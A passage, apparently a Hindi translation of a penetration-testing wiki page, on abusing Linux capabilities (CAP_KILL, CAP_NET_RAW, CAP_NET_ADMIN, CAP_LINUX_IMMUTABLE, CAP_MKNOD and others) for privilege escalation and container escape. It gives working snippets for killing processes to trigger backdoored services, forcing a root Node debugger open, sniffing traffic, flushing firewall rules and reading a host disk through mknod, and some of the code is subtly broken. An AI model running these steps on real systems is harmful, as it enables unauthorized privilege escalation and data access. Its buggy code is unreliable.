[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: यह **प्रभावी क्षमताओं के लिए एक सीमित सुपरसेट** है जो थ्रेड ग्रहण कर सकता है। यह उन क्षमताओं के लिए भी एक सीमित सुपरसेट है जिन्हें एक थ्रेड द्वारा विरासत में ली जाने वाली सेट में जोड़ा जा सकता है जो अपने प्रभावी सेट में **CAP_SETPCAP** क्षमता नहीं रखता है।_\
ऐसा लगता है कि Permitted क्षमताएँ उन क्षमताओं को सीमित करती हैं जिन्हें उपयोग किया जा सकता है।\
हालांकि, Docker डिफ़ॉल्ट रूप से **CAP_SETPCAP** भी प्रदान करता है, इसलिए आप **विरासत में ली जाने वाली क्षमताओं के भीतर नई क्षमताएँ सेट करने में सक्षम हो सकते हैं**।\
हालांकि, इस क्षमता के दस्तावेज़ में: _CAP_SETPCAP : \[…] **कॉलिंग थ्रेड के बाउंडिंग** सेट से किसी भी क्षमता को इसके विरासत में ली जाने वाली सेट में जोड़ें।_\
ऐसा लगता है कि हम केवल बाउंडिंग सेट से विरासत में ली जाने वाली सेट में क्षमताएँ जोड़ सकते हैं। जिसका अर्थ है कि **हम नई क्षमताएँ जैसे CAP_SYS_ADMIN या CAP_SYS_PTRACE को विरासत सेट में नहीं डाल सकते हैं ताकि विशेषाधिकार बढ़ाए जा सकें**।

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) कई संवेदनशील संचालन प्रदान करता है जिसमें `/dev/mem`, `/dev/kmem` या `/proc/kcore` तक पहुँच, `mmap_min_addr` को संशोधित करना, `ioperm(2)` और `iopl(2)` सिस्टम कॉल्स तक पहुँच, और विभिन्न डिस्क कमांड शामिल हैं। `FIBMAP ioctl(2)` भी इस क्षमता के माध्यम से सक्षम है, जिसने [अतीत में](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) समस्याएँ उत्पन्न की हैं। मैन पेज के अनुसार, यह धारक को अन्य उपकरणों पर वर्णनात्मक रूप से `डिवाइस-विशिष्ट संचालन की एक श्रृंखला करने` की अनुमति भी देता है।

यह **विशेषाधिकार वृद्धि** और **Docker ब्रेकआउट** के लिए उपयोगी हो सकता है।

## CAP_KILL

**इसका मतलब है कि किसी भी प्रक्रिया को मारना संभव है।**

**बाइनरी के साथ उदाहरण**

मान लीजिए कि **`python`** बाइनरी के पास यह क्षमता है। यदि आप **किसी सेवा या सॉकेट कॉन्फ़िगरेशन** (या किसी सेवा से संबंधित किसी भी कॉन्फ़िगरेशन फ़ाइल) फ़ाइल को भी संशोधित कर सकते हैं, तो आप इसे बैकडोर कर सकते हैं, और फिर उस सेवा से संबंधित प्रक्रिया को मार सकते हैं और अपनी बैकडोर के साथ नए कॉन्फ़िगरेशन फ़ाइल के निष्पादन की प्रतीक्षा कर सकते हैं।
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

यदि आपके पास kill क्षमताएँ हैं और एक **node प्रोग्राम root के रूप में** (या किसी अन्य उपयोगकर्ता के रूप में) चल रहा है, तो आप शायद इसे **संकेत SIGUSR1** भेज सकते हैं और इसे **node debugger** खोलने के लिए मजबूर कर सकते हैं जहाँ आप कनेक्ट कर सकते हैं।
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**इसका मतलब है कि किसी भी पोर्ट पर सुनना संभव है (यहां तक कि विशेषाधिकार वाले पोर्ट पर भी)।** आप इस क्षमता के साथ सीधे विशेषाधिकार नहीं बढ़ा सकते।

**बाइनरी के साथ उदाहरण**

यदि **`python`** के पास यह क्षमता है, तो यह किसी भी पोर्ट पर सुनने में सक्षम होगा और यहां तक कि इससे किसी अन्य पोर्ट से कनेक्ट भी कर सकेगा (कुछ सेवाओं को विशिष्ट विशेषाधिकार वाले पोर्ट से कनेक्शन की आवश्यकता होती है)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) क्षमता प्रक्रियाओं को **RAW और PACKET सॉकेट बनाने** की अनुमति देती है, जिससे वे मनमाने नेटवर्क पैकेट उत्पन्न और भेज सकते हैं। यह कंटेनराइज्ड वातावरण में सुरक्षा जोखिमों का कारण बन सकता है, जैसे पैकेट स्पूफिंग, ट्रैफ़िक इंजेक्शन, और नेटवर्क एक्सेस नियंत्रणों को बायपास करना। दुर्भावनापूर्ण अभिनेता इसका उपयोग कंटेनर रूटिंग में हस्तक्षेप करने या होस्ट नेटवर्क सुरक्षा को कमजोर करने के लिए कर सकते हैं, विशेष रूप से जब उचित फ़ायरवॉल सुरक्षा नहीं हो। इसके अतिरिक्त, **CAP_NET_RAW** विशेषाधिकार प्राप्त कंटेनरों के लिए RAW ICMP अनुरोधों के माध्यम से पिंग जैसी संचालन का समर्थन करने के लिए महत्वपूर्ण है।

**इसका मतलब है कि ट्रैफ़िक को स्निफ़ करना संभव है।** आप इस क्षमता के साथ सीधे विशेषाधिकार नहीं बढ़ा सकते।

**बाइनरी के साथ उदाहरण**

यदि बाइनरी **`tcpdump`** के पास यह क्षमता है, तो आप इसका उपयोग नेटवर्क जानकारी कैप्चर करने के लिए कर सकेंगे।
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
ध्यान दें कि यदि **environment** यह क्षमता दे रहा है, तो आप **`tcpdump`** का उपयोग करके ट्रैफ़िक को स्निफ़ भी कर सकते हैं।

**बाइनरी 2 के साथ उदाहरण**

निम्नलिखित उदाहरण **`python2`** कोड है जो "**lo**" (**localhost**) इंटरफ़ेस के ट्रैफ़िक को इंटरसेप्ट करने के लिए उपयोगी हो सकता है। यह कोड [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) से "_The Basics: CAP-NET_BIND + NET_RAW_" प्रयोगशाला का है।
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) क्षमता धारक को **नेटवर्क कॉन्फ़िगरेशन में परिवर्तन** करने की शक्ति देती है, जिसमें फ़ायरवॉल सेटिंग्स, रूटिंग तालिकाएँ, सॉकेट अनुमतियाँ, और एक्सपोज़ किए गए नेटवर्क नामस्थान के भीतर नेटवर्क इंटरफ़ेस सेटिंग्स शामिल हैं। यह नेटवर्क इंटरफ़ेस पर **प्रोमिस्क्यूअस मोड** चालू करने की अनुमति भी देता है, जिससे नामस्थान के बीच पैकेट स्निफ़िंग की जा सके।

**Example with binary**

मान लीजिए कि **python binary** के पास ये क्षमताएँ हैं।
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**इसका मतलब है कि inode विशेषताओं को संशोधित करना संभव है।** आप इस क्षमता के साथ सीधे विशेषाधिकार नहीं बढ़ा सकते।

**बाइनरी के साथ उदाहरण**

यदि आप पाते हैं कि एक फ़ाइल अपरिवर्तनीय है और पायथन के पास यह क्षमता है, तो आप **अपरिवर्तनीय विशेषता को हटा सकते हैं और फ़ाइल को संशोधित करने योग्य बना सकते हैं:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!NOTE]
> ध्यान दें कि आमतौर पर यह अपरिवर्तनीय विशेषता सेट और हटाई जाती है:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `chroot(2)` सिस्टम कॉल के निष्पादन की अनुमति देता है, जो संभावित रूप से ज्ञात कमजोरियों के माध्यम से `chroot(2)` वातावरण से भागने की अनुमति दे सकता है:

- [विभिन्न chroot समाधानों से बाहर कैसे निकलें](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot भागने का उपकरण](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) केवल सिस्टम पुनरारंभ के लिए `reboot(2)` सिस्टम कॉल के निष्पादन की अनुमति नहीं देता, जिसमें कुछ हार्डवेयर प्लेटफार्मों के लिए अनुकूलित विशिष्ट आदेश जैसे `LINUX_REBOOT_CMD_RESTART2` शामिल हैं, बल्कि यह `kexec_load(2)` का उपयोग करने की अनुमति भी देता है और, Linux 3.17 से आगे, नए या हस्ताक्षरित क्रैश कर्नेल को लोड करने के लिए `kexec_file_load(2)` का उपयोग भी सक्षम करता है।

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) को Linux 2.6.37 में व्यापक **CAP_SYS_ADMIN** से अलग किया गया था, विशेष रूप से `syslog(2)` कॉल का उपयोग करने की क्षमता प्रदान करता है। यह क्षमता `/proc` और समान इंटरफेस के माध्यम से कर्नेल पते देखने की अनुमति देती है जब `kptr_restrict` सेटिंग 1 पर होती है, जो कर्नेल पते के प्रदर्शन को नियंत्रित करती है। Linux 2.6.39 से, `kptr_restrict` का डिफ़ॉल्ट 0 है, जिसका अर्थ है कि कर्नेल पते प्रदर्शित होते हैं, हालांकि कई वितरण इसे 1 (uid 0 को छोड़कर पते छिपाना) या 2 (हमेशा पते छिपाना) के लिए सुरक्षा कारणों से सेट करते हैं।

इसके अतिरिक्त, **CAP_SYSLOG** `dmesg_restrict` 1 पर सेट होने पर `dmesg` आउटपुट तक पहुंचने की अनुमति देता है। इन परिवर्तनों के बावजूद, **CAP_SYS_ADMIN** ऐतिहासिक पूर्ववृत्त के कारण `syslog` संचालन करने की क्षमता बनाए रखता है।

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `mknod` सिस्टम कॉल की कार्यक्षमता को नियमित फ़ाइलों, FIFOs (नामित पाइप), या UNIX डोमेन सॉकेट बनाने से परे बढ़ाता है। यह विशेष फ़ाइलों के निर्माण की अनुमति देता है, जिसमें शामिल हैं:

- **S_IFCHR**: वर्ण विशेष फ़ाइलें, जो टर्मिनल जैसे उपकरण हैं।
- **S_IFBLK**: ब्लॉक विशेष फ़ाइलें, जो डिस्क जैसे उपकरण हैं।

यह क्षमता उन प्रक्रियाओं के लिए आवश्यक है जिन्हें डिवाइस फ़ाइलें बनाने की आवश्यकता होती है, जो वर्ण या ब्लॉक उपकरणों के माध्यम से सीधे हार्डवेयर इंटरैक्शन को सुविधाजनक बनाती है।

यह एक डिफ़ॉल्ट डॉकर क्षमता है ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))।

यह क्षमता मेज़बान पर विशेषाधिकार वृद्धि (पूर्ण डिस्क पढ़ने के माध्यम से) करने की अनुमति देती है, इन शर्तों के तहत:

1. मेज़बान पर प्रारंभिक पहुंच हो (अप्रिविलेज्ड)।
2. कंटेनर पर प्रारंभिक पहुंच हो (प्रिविलेज्ड (EUID 0), और प्रभावी `CAP_MKNOD`)।
3. मेज़बान और कंटेनर को समान उपयोगकर्ता नामस्थान साझा करना चाहिए।

**कंटेनर में एक ब्लॉक डिवाइस बनाने और एक्सेस करने के चरण:**

1. **मेज़बान पर एक मानक उपयोगकर्ता के रूप में:**

- `id` के साथ अपने वर्तमान उपयोगकर्ता आईडी का निर्धारण करें, जैसे `uid=1000(standarduser)`।
- लक्षित डिवाइस की पहचान करें, उदाहरण के लिए, `/dev/sdb`।

2. **कंटेनर के अंदर `root` के रूप में:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **होस्ट पर वापस:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
यह दृष्टिकोण मानक उपयोगकर्ता को कंटेनर के माध्यम से `/dev/sdb` से डेटा तक पहुंचने और संभावित रूप से पढ़ने की अनुमति देता है, साझा उपयोगकर्ता नामस्थान और डिवाइस पर सेट की गई अनुमतियों का लाभ उठाते हुए।

### CAP_SETPCAP

**CAP_SETPCAP** एक प्रक्रिया को **दूसरी प्रक्रिया के क्षमता सेट को बदलने** की अनुमति देता है, जिससे प्रभावी, विरासत में मिलने वाले, और अनुमत सेट से क्षमताओं को जोड़ने या हटाने की अनुमति मिलती है। हालाँकि, एक प्रक्रिया केवल उन क्षमताओं को संशोधित कर सकती है जो उसके अपने अनुमत सेट में हैं, यह सुनिश्चित करते हुए कि यह किसी अन्य प्रक्रिया के विशेषाधिकारों को अपने से अधिक नहीं बढ़ा सकती। हाल के कर्नेल अपडेट ने इन नियमों को कड़ा कर दिया है, `CAP_SETPCAP` को केवल अपने या अपने वंशजों के अनुमत सेट में क्षमताओं को कम करने के लिए सीमित कर दिया है, जिसका उद्देश्य सुरक्षा जोखिमों को कम करना है। उपयोग के लिए प्रभावी सेट में `CAP_SETPCAP` और अनुमत सेट में लक्षित क्षमताओं का होना आवश्यक है, संशोधनों के लिए `capset()` का उपयोग करते हुए। यह `CAP_SETPCAP` के मुख्य कार्य और सीमाओं का सारांश प्रस्तुत करता है, विशेषाधिकार प्रबंधन और सुरक्षा संवर्धन में इसकी भूमिका को उजागर करता है।

**`CAP_SETPCAP`** एक Linux क्षमता है जो एक प्रक्रिया को **दूसरी प्रक्रिया के क्षमता सेट को संशोधित करने** की अनुमति देती है। यह अन्य प्रक्रियाओं के प्रभावी, विरासत में मिलने वाले, और अनुमत क्षमता सेट से क्षमताओं को जोड़ने या हटाने की क्षमता प्रदान करती है। हालाँकि, इस क्षमता के उपयोग पर कुछ प्रतिबंध हैं।

`CAP_SETPCAP` वाली एक प्रक्रिया **केवल उन क्षमताओं को प्रदान या हटा सकती है जो उसके अपने अनुमत क्षमता सेट में हैं**। दूसरे शब्दों में, एक प्रक्रिया किसी अन्य प्रक्रिया को क्षमता नहीं दे सकती यदि उसके पास वह क्षमता स्वयं नहीं है। यह प्रतिबंध एक प्रक्रिया को किसी अन्य प्रक्रिया के विशेषाधिकारों को अपने स्तर से अधिक बढ़ाने से रोकता है।

इसके अलावा, हाल के कर्नेल संस्करणों में, `CAP_SETPCAP` क्षमता को **और अधिक प्रतिबंधित** किया गया है। यह अब एक प्रक्रिया को अन्य प्रक्रियाओं के क्षमता सेट को मनमाने ढंग से संशोधित करने की अनुमति नहीं देता। इसके बजाय, यह **केवल एक प्रक्रिया को अपने अनुमत क्षमता सेट या अपने वंशजों के अनुमत क्षमता सेट में क्षमताओं को कम करने की अनुमति देता है**। यह परिवर्तन क्षमता से संबंधित संभावित सुरक्षा जोखिमों को कम करने के लिए पेश किया गया था।

`CAP_SETPCAP` का प्रभावी ढंग से उपयोग करने के लिए, आपके पास अपने प्रभावी क्षमता सेट में क्षमता होनी चाहिए और लक्षित क्षमताएँ आपके अनुमत क्षमता सेट में होनी चाहिए। आप फिर अन्य प्रक्रियाओं के क्षमता सेट को संशोधित करने के लिए `capset()` सिस्टम कॉल का उपयोग कर सकते हैं।

संक्षेप में, `CAP_SETPCAP` एक प्रक्रिया को अन्य प्रक्रियाओं के क्षमता सेट को संशोधित करने की अनुमति देता है, लेकिन यह उन क्षमताओं को प्रदान नहीं कर सकता जो उसके पास स्वयं नहीं हैं। इसके अलावा, सुरक्षा चिंताओं के कारण, हाल के कर्नेल संस्करणों में इसकी कार्यक्षमता को केवल अपने अनुमत क्षमता सेट या अपने वंशजों के अनुमत क्षमता सेट में क्षमताओं को कम करने की अनुमति देने के लिए सीमित कर दिया गया है।

## संदर्भ

**इनमें से अधिकांश उदाहरण** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) के कुछ प्रयोगशालाओं से लिए गए हैं, इसलिए यदि आप इन प्रिवेस्क तकनीकों का अभ्यास करना चाहते हैं तो मैं इन प्रयोगशालाओं की सिफारिश करता हूँ।

**अन्य संदर्भ**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
